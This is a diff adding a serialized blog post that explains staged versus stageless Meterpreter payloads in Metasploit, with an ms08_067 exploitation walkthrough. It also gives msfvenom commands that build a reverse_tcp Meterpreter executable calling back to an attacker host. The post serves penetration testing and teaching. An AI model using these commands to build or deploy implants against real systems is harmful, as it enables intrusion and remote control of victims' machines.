@@ -1,0 +1,170 @@
+I"JB<p>Metasploit has long supported a mixture of staged and stageless payloads within its toolset. The mixture of payloads gives penetration testers a huge collection of options to choose from when performing exploitation. However, one option has been missing from this collection, and that is the notion of a stageless Meterpreter payload. In this post, I’d like to explain what this means, why you should care, and show how the latest update to Metasploit and Meterpreter provides this funky new feature as portended by Tod’s last Wrapup post.</p>
+
+<h2 id="what-is-a-staged-payload">What is a staged payload?</h2>
+
+<p>A staged payload is simply a payload that is as compact as possible and performs the single task of providing the means for an attacker to upload something bigger. Staged payloads are often used in exploit scenarios due to the fact that binary exploitation often results in very little space for shellcode to be stored.</p>
+
+<p>The initial shellcode (often referred to as <em>stage0</em>) may create a new connection back to the attacker’s machine and read a larger payload into memory. Once the payload has been received, <em>stage0</em> passes control to the new, larger payload.</p>
+
+<p>In Metasploit terms, this payload is called <code class="highlighter-rouge">reverse_tcp</code>, and the second stage (<em>stage1</em>) might be a standard command shell, or it might be something more complex, such as a Meterpreter shell or a VNC session. There are other staged options such as <code class="highlighter-rouge">reverse_https</code> and <code class="highlighter-rouge">bind_tcp</code>, both of which provide different transport options for opening the doorway for the second stage.</p>
+
+<h2 id="exploitation-recap-with-staged-meterpreter">Exploitation (recap) with staged Meterpreter</h2>
+
+<p>Staged Meterpreter is Meterpreter as we currently know it. Every time we <code class="highlighter-rouge">set PAYLOAD windows/meterpreter/...</code> we are asking Metasploit to prepare a payload that is broken into two stages, the second of which gives us a Meterpreter session. For the benefit of those who aren’t familiar with the process of exploitation with staged payloads, let’s take a look at what goes on when we use this payload to exploit a Windows machine using <code class="highlighter-rouge">ms08_067_netapi</code>.</p>
+
+<p>The following image is a representation of two machines, an attacker and a target. The former is running Metasploit with the <code class="highlighter-rouge">ms08_067_netapi</code> exploit configured to use a staged Meterpreter payload that has <em>stage0</em> set to <code class="highlighter-rouge">reverse_tcp</code> using port <code class="highlighter-rouge">4444</code>. The latter is an instance of Windows running a vulnerable implementation of SMB listening on port <code class="highlighter-rouge">445</code>.</p>
+
+<p><img src="https://i.imgur.com/Pltdmgn.png" alt="1" /></p>
+
+<p>When the payload is executed, Metasploit creates a listener on the correct port, and then establishes a connection to the target SMB service. Behind the scenes, when the target SMB service receives the connection, a function is invoked which contains a stack buffer that the attacking machine will overflow.</p>
+
+<p><img src="https://i.imgur.com/7lG6hDQ.png" alt="2" /></p>
+
+<p>The attacking machine then sends data that is bigger than the target expects. This data, which contains <em>stage0</em> and a small bit of exploit-specific code, overflows the target buff. The exploit-specific code allows for the attacker to gain control over EIP and redirect process execution to the <em>stage0</em> shellcode.</p>
+
+<p><img src="https://i.imgur.com/1qvayg9.png" alt="3" /></p>
+
+<p>At this point, the attacker has control of execution within the SMB service, but doesn’t really have the ability to do much else with it due to the size constraint. When <em>stage0</em> (<code class="highlighter-rouge">reverse_tcp</code>) executes, it connects back to the attacker on the required port, which is ready and waiting with <em>stage1</em>. In the case of Meterpreter, <em>stage1</em> is a DLL called <strong>metsrv</strong>.</p>
+
+<p><img src="https://i.imgur.com/AiIu6z2.png" alt="4" /></p>
+
+<p>The <strong>metsrv</strong> DLL is then sent to the target machine through this reverse connection. This is what is happening when we see the “Sending stage …” message in <code class="highlighter-rouge">msfconsole</code>.</p>
+
+<p><img src="https://i.imgur.com/IUwa6ZO.png" alt="5" /></p>
+
+<p>The <code class="highlighter-rouge">769356</code> bytes that is shown in the above image represents the entire <strong>metsrv</strong> DLL (bear in mind this is an older version of <strong>metsrv</strong>, and hence it’s a bit smaller in this image than it is these days). Once this has been pushed to the target machine, the <em>stage0</em> shellcode writes this into memory.</p>
+
+<p><img src="https://i.imgur.com/H5xQrtY.png" alt="6" /></p>
+
+<p>Once <em>stage1</em> is in memory, <em>stage0</em> passes control to it by simply jumping to the location where the payload was written to. In the case of <strong>metsrv</strong>, the first <code class="highlighter-rouge">60</code>(ish) bytes is a clever collection of shellcode that also looks similar to a valid DOS header. This shellcode, when executed, uses <a href="https://github.com/rapid7/ReflectiveDLLInjection/">Reflective DLL Injection</a> to remap and load <strong>metsrv</strong> into memory in such a way that allows it to function correctly as a normal DLL without writing it to disk or registering it with the host process. It then invokes DllMain() on this loaded DLL, and the Meterpreter that we know and love takes over.</p>
+
+<p>From here, MSF pushes up two Meterpreter extension DLLs: <strong>stdapi</strong> and <strong>priv</strong>. Both of these are also reflectively loaded in the same way the original <strong>metsrv</strong> DLL was. At this point, Meterpreter is now ready and willing to take your commands.</p>
+
+<p><img src="https://i.imgur.com/iX4Pf2c.png" alt="7" /></p>
+
+<h2 id="whats-wrong-with-staged-meterpreter">What’s wrong with staged Meterpreter?</h2>
+
+<p>Staged Meterpreter, in scenarios like that shown above, is a wonderful thing and works very well. However, the are other scenarios for compromise where this approach is less than ideal.</p>
+
+<p>In case you didn’t notice, in order to get a Meterpreter session running in the example scenario we uploaded the following:</p>
+
+<ul>
+  <li><em>stage0</em>: large buffer of junk plus approximately <code class="highlighter-rouge">350b</code> of shellcode.</li>
+  <li><em>stage1</em>: <strong>metsrv</strong> DLL approximately <code class="highlighter-rouge">755kb</code>.</li>
+  <li><em>stage2</em>: <strong>stdapi</strong> DLL approximately <code class="highlighter-rouge">370kb</code>.</li>
+  <li><em>stage3</em>: <strong>priv</strong> DLL approximately <code class="highlighter-rouge">115kb</code>.</li>
+</ul>
+
+<p>This weighs in at a grand total of approximately <code class="highlighter-rouge">1,240kb</code>! Not a small amount, particularly for those who aren’t on the local network.</p>
+
+<p>The most common example of where this falls down is the case where penetration testers are in a low-bandwidth or high-latency environments and have pre-generated a stageled Meterpreter binary that is then hosted outside of the attacker’s machine. Assessment targets download and invoke this binary, which results in the attacker gaining a Meterpreter shell on the target machine.</p>
+
+<p>The data or time cost of uploading <strong>metsrv</strong>, <strong>stdapi</strong> and <strong>priv</strong> for every single shell becomes unwieldy or outright impossible, even for a small number of shells. For large-scale compromise, via approaches such as <a href="https://en.wikipedia.org/wiki/Group_Policy">GPO</a> updates or <a href="https://en.wikipedia.org/wiki/System_Center_Configuration_Manager">SCCM</a> packages, handling the volume of incoming connections at once can be bad enough; add the three DLL uploads to this mix and you have a recipe for lost shells and sadness. Nobody likes losing shells. Nobody likes sadness.</p>
+
+<p>It’s hard to believe it possible, but in this case the following image could be considered a nightmare.</p>
+
+<p><img src="https://i.imgur.com/7NxOVq0.png" alt="8" /></p>
+
+<p>In such a scenario, it would be better to have the ability to create a <em>stage0</em> which includes <strong>metsrv</strong> and any number of Meterpreter extensions. This means that the payload already includes the important part of the Meterpreter functionality, along with all the features that the attacker might require. When invoked, the Meterpreter instance already has all it needs to function, and hence Metasploit doesn’t need to waste time or bandwidth performing the usual uploads that are required with the staged approach.</p>
+
+<p>Stageless Meterpreter is exactly that. It is a binary that includes all of the required parts of Meterpreter, along with any required extensions, all bundled into one.</p>
+
+<h2 id="what-does-stageless-meterpreter-look-like">What does stageless Meterpreter look like?</h2>
+
+<p>As with the staged version, stageless Meterpreter payloads begin with a small bootstrapper. However, this bootstrapper looks very different. Staged Meterpreter payload bootstrappers contain shellcode that performs network communications in order to read in the second stage prior to invoking it. The stageless counterparts don’t have this responsibility, as it is instead handled by <strong>metsrv</strong> itself. As a result, what we know as <em>stage0</em> completely disappears.</p>
+
+<p>Instead, that which is known as <em>stage1</em> in staged Meterpreter land becomes the bootstrapper for the payload in stageless Meterpreter land. To make this clear, let’s take a look at the process.</p>
+
+<p>When creating the payload, Metasploit first reads a copy of the <strong>metsrv</strong> DLL into memory. It then overwrites the DLL’s <a href="https://en.wikipedia.org/wiki/DOS_MZ_executable">DOS header</a> with a selection of shellcode that does the following:</p>
+
+<ol>
+  <li>Performs a simple GetPC routine.</li>
+  <li>Calculates the location of the <code class="highlighter-rouge">ReflectiveLoader()</code> function in <strong>metsrv</strong>.</li>
+  <li>Invokes the <code class="highlighter-rouge">ReflectiveLoader()</code> function in <strong>metsrv</strong>.</li>
+  <li>Calculates the location in memory which indicates the start of the list of pre-loaded extensions. This value is simply the location that immediately follows the end of <strong>metsrv</strong>.</li>
+  <li>Invokes <code class="highlighter-rouge">DllMain()</code> on <strong>metsrv</strong>, passing in <code class="highlighter-rouge">DLL_METASPLOIT_ATTACH</code> along with the pointer to the extensions list. This is where <strong>metsrv</strong> takes over.</li>
+  <li>When <strong>metsrv</strong> exits, the bootstrapper then calls <code class="highlighter-rouge">DllMain()</code> again with <code class="highlighter-rouge">DLL_METASPLOIT_DETACH</code> along with the selected <code class="highlighter-rouge">EXITFUNC</code> identifier. This is where <strong>metsrv</strong> exits using the appropriate method depending on what was chosen.</li>
+</ol>
+
+<p>With this shellcode stub wired into the DOS header, Metasploit adds the entire binary blob to an in-memory payload buffer, and then iterates through the list of chosen extensions. For each extension that is specified, Metasploit does the following:</p>
+
+<ol>
+  <li>Loads the extension DLL into memory.</li>
+  <li>Calculates the size of the DLL.</li>
+  <li>Writes the size of the DLL as a 32-bit value to the end of payload buffer.</li>
+  <li>Writes the entire body of the DLL, as-is, to the end of the payload buffer.</li>
+</ol>
+
+<p>Once the end of the list of extensions is reached, the last thing that is written to the payload buffer is a 32-bit representation of <code class="highlighter-rouge">0</code> (<code class="highlighter-rouge">NULL</code>) which indicates that the list of extensions has been terminated. This <code class="highlighter-rouge">NULL</code> value is what <strong>metsrv</strong> will look for when iterating through the list of extensions so that it knows when to stop.</p>
+
+<p>The final payload layout looks like the following:</p>
+
+<p><img src="https://i.imgur.com/SPVuOgJ.png" alt="9" />
+<strong>TODO</strong> Fix this up to include the configuration block.</p>
+
+<p>This payload can be embedded in an exe file, encoded, thrown into an exploit (assuming there’s room!), and who knows what else! The important thing is that we now have all of the bits that we need in the one payload.</p>
+
+<h2 id="how-do-i-use-stageless-meterpreter">How do I use stageless Meterpreter?</h2>
+
+<p>Firstly, it has a different name! It follows the same convention as all of the other staged vs stageless payloads:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th><strong>Payload</strong></th>
+      <th><strong>Staged</strong></th>
+      <th><strong>Stageless</strong></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Reverse TCP</td>
+      <td><code class="highlighter-rouge">windows/meterpreter/reverse_tcp</code></td>
+      <td><code class="highlighter-rouge">windows/meterpreter_reverse_tcp</code></td>
+    </tr>
+    <tr>
+      <td>Reverse HTTPS</td>
+      <td><code class="highlighter-rouge">windows/meterpreter/reverse_https</code></td>
+      <td><code class="highlighter-rouge">windows/meterpreter_reverse_https</code></td>
+    </tr>
+    <tr>
+      <td>Bind TCP</td>
+      <td><code class="highlighter-rouge">windows/meterpreter/bind_tcp</code></td>
+      <td><code class="highlighter-rouge">windows/meterpreter_bind_tcp</code></td>
+    </tr>
+    <tr>
+      <td>Reverse TCP IPv6</td>
+      <td><code class="highlighter-rouge">windows/meterpreter/reverse_ipv6_tcp</code></td>
+      <td><code class="highlighter-rouge">windows/meterpreter_reverse_ipv6_tcp</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>To create a payload using one of these babies, you use <code class="highlighter-rouge">msfvenom</code> just like you would any other payload.</p>
+
+<p>To make a stageless payload that contains only <strong>metsrv</strong> we do the following:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./msfvenom -p windows/meterpreter_reverse_tcp LHOST=172.16.52.1 LPORT=4444 -f exe -o stageless.exe
+</code></pre></div></div>
+
+<p>Here we’re making use of the Immunity Debugger program binary because it has a large enough .text section.</p>
+
+<p>To add extensions to the payload, we can make use of the <code class="highlighter-rouge">EXTENSIONS</code> parameter, which takes a comma-separated list of extension names.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./msfvenom -p windows/meterpreter_reverse_tcp LHOST=172.16.52.1 LPORT=4444 EXTENSIONS=stdapi,priv -f exe -o stageless.exe
+</code></pre></div></div>
+
+<p>With a payload created, we can set up a listener which will handle the connection using <code class="highlighter-rouge">msfconsole</code>.</p>
+
+<p><img src="https://i.imgur.com/rBJhnCU.png" alt="11" /></p>
+
+<p>You’ll notice that the <code class="highlighter-rouge">EXTENSIONS</code> parameter isn’t set in the handler. This is because the handler isn’t responsible for them as they’re already in the payload binary.</p>
+
+<p>Also note the lack of the “Sending stage …” message! This shows that the upload of <em>stage1</em> didn’t happen as it’s not needed. If the payload that was invoked also contained <strong>stdapi</strong> and <strong>priv</strong>, then absolutely no uploads have occurred at this point.</p>
+
+<p>Congratulations, you’re dancing with stageless Meterpreter!</p>
+
+<p>We’re still in the process of finalising the Metasploit-side of how the pre-loaded extensions are managed. At this point, all of the pre-loaded extensions have been loaded into Meterpreter and are available for use. However, Metasploit is yet to know about them. To initiate client-site wiring of any of the pre-loaded extensions, the user can just type <code class="highlighter-rouge">use &lt;extension&gt;</code> just like they used to. Metasploit will check to see if the extension already exists in the target instance, and if it does, it will skip the extension upload and just wire-up the functions on the client side. If the extension is missing, then it will upload it and wire-up the functions on the fly just like it always has done.</p>
+
+<p>If you’re working with <code class="highlighter-rouge">meterpreter_reverse_https</code>, you’ll notice that when new shells come in they appear just like an orphaned instance. This is expected behaviour, because a stageless session can’t and won’t look any different to an old session that hasn’t been in touch with Metasploit for a while.</p>
+:ET
